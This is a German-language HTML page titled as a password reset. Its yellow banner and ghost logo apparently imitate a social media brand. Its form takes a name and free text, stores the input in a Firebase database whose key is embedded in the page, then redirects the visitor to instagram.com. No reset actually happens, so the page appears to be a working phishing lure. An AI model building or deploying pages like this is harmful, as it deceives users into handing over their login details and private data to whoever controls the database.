<!DOCTYPE html>

<html lang="de">
  
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Passwort zurücksetzen</title>
<link rel="icon" type="image/png" sizes="32x32" href="Favicon.png">
<link rel="icon" type="image/png" sizes="16x16" href="Favicon.png">
<link rel="apple-touch-icon" href="Favicon.png">
</head>
  
<style>
  
/* BODY */
body {
  font-family: Arial;
  text-align: center;
  padding: 50px;
  margin: 0;
  background-color: #f0f0f0;
  color: #111;
}

/* Banner1 */
.banner {
  background-color: #fffc00;   /* gelber Balken */
  display: flex;
  align-items: center;        /* Logos vertikal zentriert */
  justify-content: flex-start;
  gap: 30px;

  height: 75px;               /* ca. 2.5x höher als 30px */
  padding: 0 20px;            /* nur links/rechts Abstand */

  position: sticky;
  top: 0;
  z-index: 1000;

  width: 100%;
  box-sizing: border-box;
}

/* Logos im Banner1 */
.banner .logo {
  height: 30px;
  width: auto;
  cursor: pointer;
  transition: transform 0.2s;
}
.banner .logo:hover {
  transform: scale(1.2);
}

/* Responsive für Mobile */
@media (max-width: 600px) {
  .banner {
    flex-wrap: wrap;
    justify-content: center;
  }
  .banner .logo {
    height: 25px;
  }
}

/* Formulare */
input, textarea, button {
  width: 90%;
  max-width: 400px;
  padding: 10px;
  margin: 5px auto;
  font-size: 16px;
  display: block;
}
textarea { height: 100px; }
button {
  cursor: pointer;
  background-color: #ff00ff;
  color: #fff;
  border: none;
  border-radius: 5px;
}

/* Bilder auf Seite */
img {
  max-width: 200%;
  height: auto;
  display: block;
  margin: 0 auto 0px;
  border-radius: 0px;
  box-shadow: 0 0px 0px rgba(0,0,0,0.5);
}
</style>

<!-- Firebase Bibliotheken -->
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>

</head>
<body>

<!-- Banner -->
<header class="banner">
  <a href="https://example.com/link1">
    <img src="Menu.jpeg" alt="Menu" class="logo">
  </a>
  <a href="https://example.com/link2">
    <img src="Ghost.jpeg" alt="Ghost" class="logo">
  </a>
  <a href="https://example.com/link3">
    <img src="search.jpeg" alt="Search" class="logo">
  </a>
</header>

<!-- Seite Inhalt -->
<img src="images/Logo.png" alt="Logo">
<h1>Benutzerantworten</h1>
<input type="text" id="benutzer" placeholder="Dein Name">
<textarea id="eingabe" placeholder="Hier tippen..."></textarea>
<button onclick="speichern()">Antwort senden</button>
<p id="status"></p>

<script>
  // Firebase Config
  const firebaseConfig = {
    apiKey: "AIzaSyDugmUCYr7puMpV72LbwrZCQNAKZSZjqvo",
    authDomain: "user-responses.firebaseapp.com",
    databaseURL: "https://user-responses-default-rtdb.firebaseio.com",
    projectId: "user-responses",
    storageBucket: "user-responses.firebasestorage.app",
    messagingSenderId: "125716368432",
    appId: "1:125716368432:web:61a661901b71b7a9e271f5",
    measurementId: "G-PDD3EP5GL6"
  };

  // Firebase initialisieren
  const app = firebase.initializeApp(firebaseConfig);
  const db = firebase.database();

  // Speichern + Weiterleitung
  function speichern() {
    const benutzer = document.getElementById('benutzer').value.trim();
    const text = document.getElementById('eingabe').value.trim();

    if(!benutzer || !text) {
      document.getElementById('status').innerText = "Bitte Name und Text eingeben!";
      return;
    }

    db.ref('antworten/' + benutzer).set({ text: text })
      .then(() => {
        document.getElementById('status').innerText = "Antwort gespeichert!";
        window.location.href = "https://instagram.com"; // <-- Hier neuen Link einfügen
      })
      .catch(err => {
        document.getElementById('status').innerText = "Fehler: " + err;
      });
  }
</script>

</body>
</html>
